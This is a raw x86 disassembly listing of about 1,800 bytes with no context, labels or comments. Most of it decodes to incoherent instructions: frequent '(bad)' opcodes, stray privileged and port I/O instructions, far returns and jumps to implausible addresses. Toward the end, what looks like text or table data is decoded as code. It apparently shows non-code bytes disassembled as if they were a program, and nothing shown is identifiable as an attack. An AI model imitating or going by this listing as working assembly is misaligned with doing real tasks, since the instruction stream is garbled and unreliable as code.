  42c16b:	mov    esi,DWORD PTR [ebx]
  42c16d:	in     al,0x8d
  42c16f:	dec    ebp
  42c170:	or     BYTE PTR [ebx],dh
  42c172:	jb     0x42c177
  42c174:	add    BYTE PTR [edi+0x45],bl
  42c177:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  42c17d:	add    BYTE PTR [ebx],dh
  42c17f:	mov    esi,DWORD PTR [ebx]
  42c181:	mov    ebp,DWORD PTR [ebx]
  42c183:	sbb    BYTE PTR [ebx-0x377403b3],cl
  42c189:	nop
  42c18a:	mov    ecx,0x338b4500
  42c18f:	add    DWORD PTR [ebx],0x70
  42c192:	mov    DWORD PTR [esi-0x8],edx
  42c195:	jne    0x42c1dc
  42c197:	mov    esi,DWORD PTR [esi]
  42c199:	push   edi
  42c19a:	pushf  
  42c19b:	push   edi
  42c19c:	mov    edx,DWORD PTR [ecx-0x15]
  42c19f:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  42c1a5:	add    BYTE PTR [ebx],dh
  42c1a7:	retf   
  42c1a8:	add    edx,ecx
  42c1aa:	ror    DWORD PTR [edi],cl
  42c1ac:	mov    DWORD PTR ds:0x7f452dfc,ebp
  42c1b2:	mov    ch,dl
  42c1b4:	mov    BYTE PTR [eax+0xb],dh
  42c1b7:	fimul  WORD PTR [ebp+0x0]
  42c1ba:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  42c1c0:	xor    esi,DWORD PTR [ebx]
  42c1c2:	mov    DWORD PTR [ebx],esi
  42c1c4:	or     BYTE PTR [ebx],al
  42c1c6:	dec    ebp
  42c1c7:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  42c1cd:	or     edi,0x8c64ca9e
  42c1d3:	out    dx,eax
  42c1d4:	loopne 0x42c1eb
  42c1d6:	(bad)  
  42c1d7:	jmp    0x13ec667
  42c1dc:	retf   0x4d4d
  42c1df:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  42c1e5:	je     0x3243608f
  42c1eb:	mov    ecx,DWORD PTR [ecx+0x45450818]
  42c1f1:	mov    DWORD PTR [ebx],esi
  42c1f3:	sbb    BYTE PTR [ecx-0x7472b3],bh
  42c1f9:	mov    eax,ecx
  42c1fb:	fmul   DWORD PTR [ebp+0x45]
  42c1fe:	mov    DWORD PTR ds:0xba459cf0,esi
  42c204:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  42c20a:	(bad)  
  42c20b:	mov    ecx,eax
  42c20d:	sbb    BYTE PTR [ecx-0x7474babb],dl
  42c213:	sbb    al,bh
  42c215:	add    dh,0x1
  42c218:	mov    DWORD PTR [eax],0x4dc1005e
  42c21e:	leave  
  42c21f:	mov    eax,DWORD PTR [eax+ebx*1]
  42c222:	push   ebp
  42c223:	mov    esp,ebp
  42c225:	add    DWORD PTR [ebp+0x0],eax
  42c228:	mov    ecx,DWORD PTR [ecx]
  42c22a:	or     BYTE PTR [eax-0x80],cl
  42c22d:	mov    DWORD PTR [ecx],eax
  42c22f:	or     al,0x0
  42c231:	inc    ebp
  42c232:	add    BYTE PTR [ebx],dh
  42c234:	in     al,dx
  42c235:	add    edx,DWORD PTR [ebx-0x77]
  42c238:	mov    esi,esp
  42c23a:	adc    BYTE PTR [ebp+0x16],al
  42c23d:	xor    edi,DWORD PTR [edi+0x7890803]
  42c243:	adc    al,0xcf
  42c245:	inc    ebp
  42c246:	sahf   
  42c247:	mov    esi,DWORD PTR [edx]
  42c249:	push   eax
  42c24a:	add    ebp,eax
  42c24c:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  42c252:	sahf   
  42c253:	mov    esp,DWORD PTR [eax+edi*1+0x42]
  42c257:	dec    ebp
  42c258:	fwait
  42c259:	dec    eax
  42c25a:	jmp    0xcdc6a0
  42c25f:	or     al,0x4d
  42c261:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  42c267:	or     al,0xd7
  42c269:	dec    ecx
  42c26a:	retf   
  42c26b:	dec    eax
  42c26c:	rcl    eax,cl
  42c26e:	retf   0xfc8
  42c271:	inc    ebp
  42c272:	or     eax,0x7f382d8b
  42c277:	sar    esp,0x3
  42c27a:	lahf   
  42c27b:	inc    eax
  42c27c:	mov    ebp,0x8b180089
  42c281:	inc    ebp
  42c282:	or     BYTE PTR [ebx],dh
  42c284:	iret   
  42c285:	add    ecx,ebx
  42c287:	mov    ecx,eax
  42c289:	adc    al,0x84
  42c28b:	inc    ebp
  42c28c:	add    al,0x33
  42c28e:	add    BYTE PTR [ebx],al
  42c290:	dec    ebp
  42c291:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  42c297:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  42c29d:	ret    
  42c29e:	inc    ebp
  42c29f:	add    edi,eax
  42c2a1:	push   ebp
  42c2a2:	or     bh,al
  42c2a4:	test   DWORD PTR [eax+edi*8],edx
  42c2a7:	test   DWORD PTR [eax+edi*8],esi
  42c2aa:	pushf  
  42c2ab:	inc    ebp
  42c2ac:	mov    DWORD PTR [edx],esi
  42c2ae:	lock pushf 
  42c2b0:	inc    ebp
  42c2b1:	(bad)  
  42c2b2:	mov    DWORD PTR [eax+ebx*1],edx
  42c2b5:	test   DWORD PTR [ebp-0x8],eax
  42c2b8:	mov    eax,DWORD PTR [ebp-0x70]
  42c2bb:	mov    eax,DWORD PTR [eax]
  42c2bd:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  42c2c3:	scas   eax,DWORD PTR es:[edi]
  42c2c4:	dec    ebp
  42c2c5:	mov    ecx,DWORD PTR [ebx+0x559008]
  42c2cb:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  42c2d1:	jb     0x42c320
  42c2d3:	add    BYTE PTR [ebx-0x387cf73f],cl
  42c2d9:	add    eax,ebx
  42c2db:	add    BYTE PTR [ebp+0x45],al
  42c2de:	mov    esi,DWORD PTR [ebx]
  42c2e0:	or     BYTE PTR [ebx],al
  42c2e2:	(bad)  
  42c2e3:	mov    ebx,eax
  42c2e5:	adc    al,0x45
  42c2e7:	inc    ebp
  42c2e8:	mov    eax,DWORD PTR [ebx]
  42c2ea:	or     al,0xdc
  42c2ec:	inc    eax
  42c2ed:	inc    ebp
  42c2ee:	cmp    edi,0xc
  42c2f1:	hlt    
  42c2f2:	inc    ebp
  42c2f3:	jne    0x42c280
  42c2f5:	mov    ecx,DWORD PTR [esp+ecx*1]
  42c2f8:	inc    eax
  42c2f9:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  42c2ff:	clc    
  42c300:	push   esp
  42c301:	inc    ebp
  42c302:	inc    ebp
  42c303:	cmp    eax,0x8b8b9c74
  42c308:	cmp    al,ah
  42c30a:	dec    ebp
  42c30b:	(bad)  
  42c30c:	mov    eax,ebx
  42c30e:	push   esp
  42c30f:	(bad)  
  42c310:	idiv   DWORD PTR [eax-0x87417dd]
  42c316:	or     al,0xff
  42c318:	inc    eax
  42c319:	inc    ebp
  42c31a:	add    eax,DWORD PTR [ebp-0x74748b15]
  42c320:	push   esp
  42c321:	loopne 0x42c368
  42c323:	(bad)  
  42c324:	mov    eax,ebx
  42c326:	or     bh,bh
  42c328:	xbegin 0x508808f1
  42c32e:	mov    ebx,esp
  42c330:	or     bh,bh
  42c332:	(bad)  
  42c333:	mov    eax,ebx
  42c335:	hlt    
  42c336:	inc    ebp
  42c337:	inc    ebp
  42c338:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  42c33e:	xor    ebp,DWORD PTR [ebx]
  42c340:	add    ecx,DWORD PTR [ecx+0x4589e089]
  42c346:	adc    al,0x8b
  42c348:	inc    ebp
  42c349:	clc    
  42c34a:	xor    eax,DWORD PTR [eax-0x64]
  42c34d:	add    eax,edi
  42c34f:	or     al,0x14
  42c351:	dec    ebp
  42c352:	test   DWORD PTR [ebx],edi
  42c354:	clc    
  42c355:	jb     0x42c39c
  42c357:	mov    esi,DWORD PTR [ecx]
  42c359:	clc    
  42c35a:	pushf  
  42c35b:	inc    eax
  42c35c:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  42c362:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  42c368:	shr    esi,0x4d
  42c36b:	add    BYTE PTR [ebx-0x30002f96],cl
  42c371:	hlt    
  42c372:	mov    WORD PTR [ebp-0x62],es
  42c375:	push   eax
  42c376:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  42c37d:	test   DWORD PTR [eax],eax
  42c37f:	clc    
  42c380:	mov    eax,DWORD PTR [ebp+0x8]
  42c383:	mov    edi,0x4585c3c8
  42c389:	clc    
  42c38a:	mov    eax,DWORD PTR [ebp+0x18]
  42c38d:	xor    eax,DWORD PTR [ebp-0x64]
  42c390:	mov    edi,eax
  42c392:	hlt    
  42c393:	shl    BYTE PTR [ebp-0x7b],0x8b
  42c397:	clc    
  42c398:	fmul   QWORD PTR [ebp+0x4d]
  42c39b:	mov    eax,ebp
  42c39d:	in     al,dx
  42c39e:	icebp  
  42c39f:	dec    ebp
  42c3a0:	dec    DWORD PTR [ecx+0x4dc7e845]
  42c3a6:	loopne 0x42c331
  42c3a8:	test   eax,edi
  42c3aa:	clc    
  42c3ab:	dec    ebp
  42c3ac:	inc    ebp
  42c3ad:	mov    DWORD PTR [ebx],esi
  42c3af:	in     al,0x3
  42c3b1:	dec    ebp
  42c3b2:	push   eax
  42c3b3:	xor    eax,DWORD PTR [ebp+0x3]
  42c3b6:	push   eax
  42c3b7:	mov    DWORD PTR [eax-0x20],edx
  42c3ba:	push   edi
  42c3bc:	mov    eax,DWORD PTR [eax]
  42c3be:	clc    
  42c3bf:	cmp    eax,0xf84e85c0
  42c3c4:	inc    ebp
  42c3c5:	test   BYTE PTR [ebx],dh
  42c3c7:	add    DWORD PTR [ebx],eax
  42c3c9:	add    BYTE PTR [eax+0x4d],dl
  42c3cc:	jne    0x42c401
  42c3ce:	lea    ecx,[ebx-0x7617fc48]
  42c3d4:	cmc    
  42c3d5:	adc    al,0xff
  42c3d7:	inc    ebp
  42c3d8:	inc    ebp
  42c3d9:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  42c3df:	jb     0x42c36c
  42c3e1:	add    ah,bl
  42c3e3:	inc    ebp
  42c3e4:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  42c3eb:	xor    ecx,DWORD PTR [ebp+0x3]
  42c3ee:	mov    edi,DWORD PTR [ebx]
  42c3f0:	adc    BYTE PTR [ebp+0x41],dh
  42c3f3:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  42c3f9:	ret    
  42c3fa:	push   ss
  42c3fb:	push   0x45
  42c3fd:	lea    ecx,[ebx+0x4de80cac]
  42c403:	cli    
  42c404:	add    edi,edi
  42c406:	or     BYTE PTR [ebp+0x4d],al
  42c409:	mov    ebp,DWORD PTR [ebx]
  42c40b:	xor    ebp,ecx
  42c40d:	mov    al,BYTE PTR [edx]
  42c40f:	add    eax,0xc7200
  42c414:	jne    0x42c463
  42c416:	lea    esi,[ebx]
  42c418:	lods   al,BYTE PTR ds:[esi]
  42c419:	psubsb mm0,mm0
  42c41c:	cmc    
  42c41d:	retf   
  42c41e:	inc    ecx
  42c420:	xor    eax,0x89019c84
  42c425:	add    ah,cl
  42c427:	inc    ebp
  42c428:	inc    ebp
  42c429:	mov    esi,DWORD PTR [ebx+esi*1]
  42c42c:	pushf  
  42c42d:	mov    al,bh
  42c42f:	add    eax,0x8572c4
  42c434:	clc    
  42c435:	dec    ebp
  42c436:	inc    ebp
  42c437:	xor    esi,DWORD PTR [edx]
  42c439:	setl   al
  42c43c:	(bad)  
  42c43d:	retf   
  42c43e:	int3   
  42c43f:	ror    DWORD PTR [ebp-0x7c],0x8d
  42c443:	add    eax,ecx
  42c445:	add    BYTE PTR [ebp+0x45],cl
  42c448:	lea    ecx,[ebx-0x75b2cc3c]
  42c44e:	lea    eax,ds:0x4d72c0
  42c454:	mov    ecx,DWORD PTR [ebp+0x8]
  42c457:	xor    ecx,edi
  42c459:	bswap  ebx
  42c45b:	ror    BYTE PTR [ebp-0x35],0xe9
  42c45f:	rol    DWORD PTR [ecx],0x84
  42c462:	add    BYTE PTR [ecx],al
  42c464:	xor    eax,DWORD PTR [eax]
  42c466:	pushf  
  42c467:	inc    ebp
  42c468:	jnp    0x8a42f86c
  42c46e:	mov    eax,DWORD PTR ds:0xcf72f0
  42c474:	lock dec ebp
  42c476:	retf   
  42c477:	xor    ecx,DWORD PTR [ebp+0xf]
  42c47a:	mov    eax,eax
  42c47c:	loopne 0x42c449
  42c47e:	test   ecx,0x19e8484
  42c484:	xor    al,BYTE PTR [eax]
  42c486:	mov    DWORD PTR [ebp-0x20],eax
  42c489:	mov    eax,DWORD PTR [ebp+0x33]
  42c48c:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  42c492:	ret    
  42c493:	add    al,cl
  42c495:	dec    ebp
  42c496:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42c49c:	add    ecx,DWORD PTR ds:0xc7250
  42c4a2:	inc    ebp
  42c4a3:	rcl    DWORD PTR [eax+0x4d],0x5f
  42c4a7:	mov    edi,edi
  42c4a9:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  42c4af:	jb     0x42c478
  42c4b1:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  42c4b8:	mov    esi,DWORD PTR [ebx]
  42c4ba:	or     BYTE PTR [edx+0x72b60dcf],cl
  42c4c0:	add    eax,DWORD PTR [eax]
  42c4c2:	cmp    ecx,eax
  42c4c4:	jne    0x42c542
  42c4ca:	mov    eax,DWORD PTR [ebp-0x18]
  42c4cd:	mov    eax,DWORD PTR [eax]
  42c4cf:	xor    eax,edi
  42c4d1:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  42c4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4db:	mov    ecx,edi
  42c4dd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c4e3:	jb     0x42c4f4
  42c4e5:	add    BYTE PTR [eax-0x3f],bl
  42c4e8:	add    BYTE PTR [ebp-0x75],cl
  42c4eb:	mov    edi,eax
  42c4ed:	xor    eax,DWORD PTR [eax]
  42c4ef:	mov    al,bh
  42c4f1:	or     eax,0x4a7284
  42c4f6:	xor    al,cl
  42c4f8:	mov    ecx,DWORD PTR [ebp+0x8]
  42c4fb:	mov    ecx,edi
  42c4fd:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42c503:	jb     0x42c514
  42c505:	add    BYTE PTR [eax],bh
  42c507:	enter  0x8500,0x8b
  42c50b:	add    ah,ah
  42c50d:	add    BYTE PTR [eax],al
  42c50f:	inc    ebp
  42c510:	(bad)  
  42c511:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  42c518:	mov    esi,DWORD PTR [edx+0x8]
  42c51b:	add    bh,cl
  42c51d:	dec    ebp
  42c51e:	mov    dh,0x8b
  42c520:	add    esi,DWORD PTR [ebx]
  42c522:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  42c528:	add    BYTE PTR [eax],al
  42c52a:	mov    eax,ecx
  42c52c:	call   0xc7cdc57e
  42c531:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d4a]
  42c538:	mov    eax,DWORD PTR [eax]
  42c53a:	in     al,dx
  42c53b:	ror    DWORD PTR [ecx],0x4d
  42c53e:	iret   
  42c53f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  42c546:	xor    dh,BYTE PTR [edx-0x75]
  42c549:	add    al,bh
  42c54b:	enter  0x5009,0xcf
  42c54f:	inc    ebp
  42c550:	mov    WORD PTR [ebx-0x75cdccb6],cs
  42c556:	or     al,BYTE PTR ds:0xec728b
  42c55c:	or     DWORD PTR [ebp-0x31],ecx
  42c55f:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  42c566:	cmp    dh,BYTE PTR [edx+0xf]
  42c569:	add    ah,dl
  42c56b:	rol    DWORD PTR [eax],0x4d
  42c56e:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  42c574:	(bad)  
  42c575:	or     eax,0x4a7284
  42c57a:	xor    al,cl
  42c57c:	mov    ecx,DWORD PTR [ebp-0x18]
  42c57f:	mov    ecx,DWORD PTR [ecx]
  42c581:	xor    ecx,edi
  42c583:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  42c58a:	xor    cl,al
  42c58c:	mov    edx,DWORD PTR [eax]
  42c58e:	in     al,0x45
  42c590:	or     DWORD PTR [eax-0x31],edx
  42c593:	mov    ds:0x8b4aff8c,eax
  42c598:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  42c59f:	inc    ebp
  42c5a0:	or     DWORD PTR [ebx],esi
  42c5a2:	iret   
  42c5a3:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144e]
  42c5aa:	cmp    dh,BYTE PTR [ebx]
  42c5ac:	jge    0x7242f642
  42c5b2:	mov    eax,DWORD PTR [eax]
  42c5b4:	in     al,0xc7
  42c5b6:	add    BYTE PTR [ebp-0x39],cl
  42c5b9:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b6]
  42c5c0:	mov    edx,ecx
  42c5c2:	clc    
  42c5c3:	test   BYTE PTR [ecx],cl
  42c5c5:	std    
  42c5c6:	iret   
  42c5c7:	dec    DWORD PTR [ebp+eax*2+0x14328b4a]
  42c5ce:	xor    al,bh
  42c5d0:	mov    eax,ebx
  42c5d2:	in     al,dx
  42c5d3:	enter  0x1109,0xcf
  42c5d7:	inc    ebp
  42c5d8:	mov    WORD PTR [ebx-0x38cde7b6],cs
  42c5de:	or     al,BYTE PTR [ebx+ecx*4+0x932f89e]
  42c5e5:	jmp    0x42c5b6
  42c5e7:	push   0xffffff8c
  42c5e9:	dec    DWORD PTR [esi-0xc]
  42c5ec:	xor    al,BYTE PTR [ebp+0x3a]
  42c5ef:	push   eax
  42c5f0:	jne    0x42c60c
  42c5f2:	mov    edi,edi
  42c5f4:	in     al,0x8b
  42c5f6:	add    BYTE PTR [eax],cl
  42c5f8:	(bad)  
  42c5f9:	dec    ebp
  42c5fa:	test   BYTE PTR [ebx],dh
  42c5fc:	dec    edx
  42c5fd:	add    esi,DWORD PTR [edx]
  42c5ff:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  42c605:	or     bh,cl
  42c607:	(bad)  
  42c608:	mov    ebx,es
  42c60a:	dec    edx
  42c60b:	push   0x32
  42c60d:	lea    esi,[edx]
  42c60f:	xchg   esp,eax
  42c610:	mov    ebp,eax
  42c612:	call   0xd041d00f
  42c617:	inc    ebp
  42c618:	mov    WORD PTR [ebx+0x4532184a],es
  42c61e:	or     bh,bh
  42c620:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  42c626:	iret   
  42c627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c628:	mov    WORD PTR [ebp+0x4e],es
  42c62b:	push   eax
  42c62c:	xor    bl,dh
  42c62e:	cmp    bh,bh
  42c630:	jne    0x42c5bd
  42c632:	lea    ecx,[eax]
  42c634:	lods   al,BYTE PTR ds:[esi]
  42c635:	dec    ebp
  42c636:	call   0xff46c06e
  42c63b:	cmp    ecx,DWORD PTR [ebp+0x74]
  42c63e:	cmp    ebp,DWORD PTR [edx+0x74]
  42c641:	dec    DWORD PTR [ebx-0x38baf758]
  42c647:	add    eax,ebx
  42c649:	fadd   DWORD PTR [ebp-0x18]
  42c64c:	mov    edi,eax
  42c64e:	lock inc edi
  42c651:	inc    ebp
  42c652:	test   BYTE PTR [ebx+0x832a89e],cl
  42c658:	xor    eax,DWORD PTR [ebp-0x75]
  42c65b:	add    ecx,DWORD PTR [eax]
  42c65d:	sbb    BYTE PTR [ebp+0x45],dl
  42c660:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  42c666:	rdpmc  
  42c668:	test   DWORD PTR [ebx],0xc18b0fff
  42c66e:	or     BYTE PTR [ebp+0x4d],cl
  42c671:	mov    esi,DWORD PTR [ebx]
  42c673:	rol    BYTE PTR [ebx],1
  42c675:	iret   
  42c676:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7462]
  42c67d:	cmp    ecx,DWORD PTR [ebp+0xf]
  42c680:	xor    edx,DWORD PTR [edi-0x73]
  42c683:	dec    DWORD PTR [eax]
  42c685:	mov    esi,DWORD PTR [edx+0x10]
  42c688:	add    BYTE PTR [ebp+0x77],al
  42c68b:	mov    DWORD PTR [eax],ebx
  42c68d:	jmp    0x42c704
  42c68f:	or     DWORD PTR [ebp-0x179b6b62],0xff65f3bf
  42c699:	pop    edi
  42c69a:	inc    ebp
  42c69b:	pop    ebx
  42c69c:	mov    eax,edx
  42c69e:	loopne 0x42c6a0
  42c6a0:	(bad)  
  42c6a1:	mov    eax,ebx
  42c6a3:	push   ecx
  42c6a4:	ror    DWORD PTR [ebx+0x4d450813],0x33
  42c6ab:	push   esi
  42c6ac:	add    edi,DWORD PTR [edi+0x7180850]
  42c6b2:	inc    ebp
  42c6b3:	(bad)  
  42c6b4:	push   eax
  42c6b5:	sahf   
  42c6b6:	dec    edi
  42c6b7:	xor    bh,bh
  42c6b9:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  42c6bf:	adc    al,0x89
  42c6c1:	adc    BYTE PTR [ecx+eax*1],0x75
  42c6c5:	add    bh,bh
  42c6c7:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  42c6ce:	fadd   DWORD PTR [eax]
  42c6d0:	call   0xff46b960
  42c6d5:	cmp    al,0x45
  42c6d7:	dec    ebp
  42c6d8:	mov    ecx,DWORD PTR [ebx+0xc7d8e0]
  42c6de:	ret    
  42c6df:	mov    eax,ecx
  42c6e1:	adc    al,0x11
  42c6e3:	add    al,0x0
  42c6e5:	add    BYTE PTR [ebp+0x0],dh
  42c6e8:	mov    edi,edi
  42c6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6eb:	push   eax
  42c6ec:	inc    ebp
  42c6ed:	add    BYTE PTR [eax-0x2f],dl
  42c6f0:	adc    eax,0x8b45ff03
  42c6f5:	xor    edx,esp
  42c6f7:	add    ecx,DWORD PTR [ebp-0x77]
  42c6fa:	add    esp,edi
  42c6fc:	mov    eax,DWORD PTR [ebp-0x58]
  42c6ff:	inc    DWORD PTR [ebp+0x14]
  42c702:	mov    DWORD PTR [ebp+0x18],eax
  42c705:	push   eax
  42c706:	inc    ebp
  42c707:	dec    DWORD PTR [ebx-0x388ae7f4]
  42c70d:	call   0xfff2c1d5
  42c712:	mov    eax,DWORD PTR [ebp+0x8]
  42c715:	mov    edx,DWORD PTR [ebp+0x33]
  42c718:	xor    eax,DWORD PTR [ebx]
  42c71a:	lea    edi,[ebx]
  42c71c:	adc    DWORD PTR [edx+esi*2-0x75],esi
  42c720:	add    BYTE PTR [ecx+eax*8],cl
  42c723:	dec    ebp
  42c724:	xor    BYTE PTR [ebx],0xfc
  42c727:	add    edi,edi
  42c729:	pcmpeqw mm0,QWORD PTR [ebp-0x75]
  42c72d:	mov    eax,ebx
  42c72f:	pop    edi
  42c730:	push   es
  42c731:	leave  
  42c732:	or     dl,BYTE PTR [eax]
  42c734:	xor    eax,0x7fec2d55
  42c739:	in     al,0xec
  42c73b:	adc    DWORD PTR [edx+0x14],0x5e
  42c73f:	xor    eax,0x53149cc9
  42c744:	push   ebp
  42c745:	dec    esp
  42c746:	in     al,dx
  42c747:	or     BYTE PTR [ecx+0x57],dl
  42c74a:	inc    ebp
  42c74b:	inc    ecx
  42c74c:	mov    ecx,DWORD PTR [ecx-0x74a8dbf0]
  42c752:	push   edi
  42c753:	and    al,0x51
  42c755:	mov    edx,0x7be0833
  42c75a:	jb     0x42c756
  42c75c:	add    BYTE PTR [esi+0x30132c6],bl
  42c762:	inc    ebp
  42c763:	mov    DWORD PTR [ebx+0x8b9424],ecx
  42c769:	or     al,0x8b
  42c76b:	jl     0x42c6f8
  42c76d:	sbb    al,0x14
  42c76f:	dec    ebp
  42c770:	xor    BYTE PTR [ebp+0x1],0x8b
  42c774:	add    BYTE PTR [eax+eax*1],ah
  42c777:	xor    eax,DWORD PTR [ecx-0x75]
  42c77a:	mov    esp,DWORD PTR [esp+edx*1]
  42c77d:	add    ecx,DWORD PTR [ecx+0xca010f]
  42c783:	dec    esp
  42c784:	dec    ecx
  42c785:	adc    BYTE PTR [edx-0x15],ch
  42c788:	push   0x103039
  42c78d:	sbb    al,0x70
  42c78f:	inc    esp
  42c790:	push   0x10
  42c792:	dec    DWORD PTR [ecx+ecx*4+0x18]
  42c796:	mov    eax,edx
  42c798:	or     BYTE PTR [edi+eax*8+0x4532c69e],al
  42c79f:	mov    DWORD PTR [ebx+0x75681024],ecx
  42c7a5:	test   DWORD PTR [ebp+0x530efcf8],ecx
  42c7ab:	jge    0x42c822
  42c7ad:	xor    edi,edi
  42c7af:	pushf  
  42c7b0:	or     BYTE PTR [ebp+0x6c],dh
  42c7b3:	push   0xf88b85ff
  42c7b8:	or     BYTE PTR [ebp+0xb],dh
  42c7bb:	inc    edi
  42c7bd:	or     dh,al
  42c7bf:	jb     0x42c789
  42c7c1:	call   DWORD PTR [eax]
  42c7c3:	mov    DWORD PTR [ebp+0x24],eax
  42c7c6:	mov    ebp,ebx
  42c7c8:	adc    bh,bh
  42c7ca:	(bad)  
  42c7cb:	and    al,0xc6
  42c7cd:	lea    ebp,[edi+0x1fffc24]
  42c7d3:	or     BYTE PTR [esi+0x74],bl
  42c7d6:	ret    0x20
  42c7d9:	je     0x42c766
  42c7db:	sbb    al,0x83
  42c7dd:	mov    edi,0xe8ecfff8
  42c7e2:	mov    ecx,0xf81485ff
  42c7e7:	je     0x42c772
  42c7e9:	pop    esp
  42c7ea:	and    al,0x75
  42c7ec:	push   esi
  42c7ed:	and    al,0x8d
  42c7ef:	and    al,0xff
  42c7f1:	inc    BYTE PTR [ebx+ecx*4+0x18]
  42c7f5:	and    al,0x7c
  42c7f7:	pop    edi
  42c7f8:	adc    BYTE PTR [ebx+0x57],bl
  42c7fb:	in     eax,0x51
  42c7fd:	ret    0x33
  42c800:	mov    esi,0x187200
  42c805:	pushf  
  42c806:	inc    BYTE PTR [ecx+0x1614857c]
  42c80c:	jge    0x42c7aa
  42c80e:	mov    DWORD PTR [esp],ecx
  42c811:	(bad)  
  42c812:	cmp    DWORD PTR [eax],ebx
  42c814:	adc    BYTE PTR [eax],bl
  42c816:	push   ss
  42c817:	dec    DWORD PTR [edi+edi*8+0x18]
  42c81b:	adc    al,0xca
  42c81d:	mov    edx,DWORD PTR [esp+ecx*1+0x10]
  42c821:	into   
  42c822:	scas   eax,DWORD PTR es:[edi]
  42c823:	mov    DWORD PTR [eax+edx*2],esp
  42c826:	das    
  42c827:	inc    ebp
  42c828:	jne    0x42c7b5
  42c82a:	and    al,0x8b
  42c82c:	and    al,0x33
  42c82e:	lea    ecx,[eax]
  42c830:	jb     0x42c876
  42c832:	xor    ebp,ebx
  42c834:	adc    al,bh
  42c836:	xor    bh,bh
  42c838:	jne    0x42c87e
  42c83a:	sbb    al,0xff
  42c83c:	call   0x52a02685
  42c841:	push   ebx
  42c842:	inc    esp
  42c843:	push   ebx
  42c844:	sbb    DWORD PTR [edi],edx
  42c846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c847:	rcr    DWORD PTR [ebp-0x6c],1
  42c84a:	jg     0x42c898
  42c84c:	test   BYTE PTR [eax-0x4821cdad],dl
  42c852:	sbb    edx,eax
  42c854:	add    al,0x0
  42c856:	add    BYTE PTR [eax],al
  42c858:	push   esp
  42c859:	cmp    bl,BYTE PTR [esi+esi*2+0x6c]
  42c85d:	popa   
  42c85e:	inc    ebp
  42c85f:	jns    0x42c8d1
  42c861:	addr16 ja 0x42c8da
  42c864:	pop    esp
  42c865:	ja     0x42c8b8
  42c867:	arpl   WORD PTR [ebx+0x49],bp
  42c86a:	jne    0x42c8dc
  42c86c:	dec    ebx
  42c86d:	dec    ecx
  42c86e:	ins    DWORD PTR es:[edi],dx
  42c86f:	addr16 dec ebp
  42c871:	pop    esp
  42c872:	push   0x6a
  42c874:	jne    0x42c8e2
  42c876:	push   0x49
  42c878:	imul   ebp,DWORD PTR [ebx+0x63],0x7a
  42c87c:	ins    BYTE PTR es:[edi],dx
  42c87d:	cs jo  0x42c8e4
  42c880:	bound  eax,QWORD PTR [eax]
  42c882:	cmp    BYTE PTR [edx+0x10],0x0
  42c886:	ins    DWORD PTR es:[edi],dx
  42c887:	das    
  42c888:	adc    BYTE PTR [eax],al
  42c88a:	jmp    0x42c8d5
  42c88c:	adc    BYTE PTR [eax],al
  42c88e:	jecxz  0x42c8f0
  42c890:	adc    BYTE PTR [eax],al
  42c892:	adc    BYTE PTR [edx+0x10],dh
  42c895:	add    bl,bh
  42c897:	pop    edi
  42c898:	adc    BYTE PTR [eax],al
  42c89a:	xlat   BYTE PTR ds:[ebx]
  42c89b:	push   es
  42c89c:	adc    BYTE PTR [eax],al
  42c89e:	cwde   
  42c89f:	add    DWORD PTR [eax],edx
  42c8a1:	add    cl,al
  42c8a3:	xchg   edx,eax
  42c8a4:	inc    edx
  42c8a5:	add    ch,al
  42c8a7:	xchg   edx,eax
  42c8a8:	inc    edx
  42c8a9:	add    cl,cl
  42c8ab:	xchg   edx,eax
  42c8ac:	inc    edx
  42c8ad:	add    ch,cl
  42c8af:	xchg   edx,eax
  42c8b0:	inc    edx
  42c8b1:	add    cl,dl
  42c8b3:	xchg   edx,eax
  42c8b4:	inc    edx
  42c8b5:	add    ch,dl
  42c8b7:	xchg   edx,eax
  42c8b8:	inc    edx
  42c8b9:	add    cl,bl
  42c8bb:	xchg   edx,eax
  42c8bc:	inc    edx
  42c8bd:	add    ch,bl
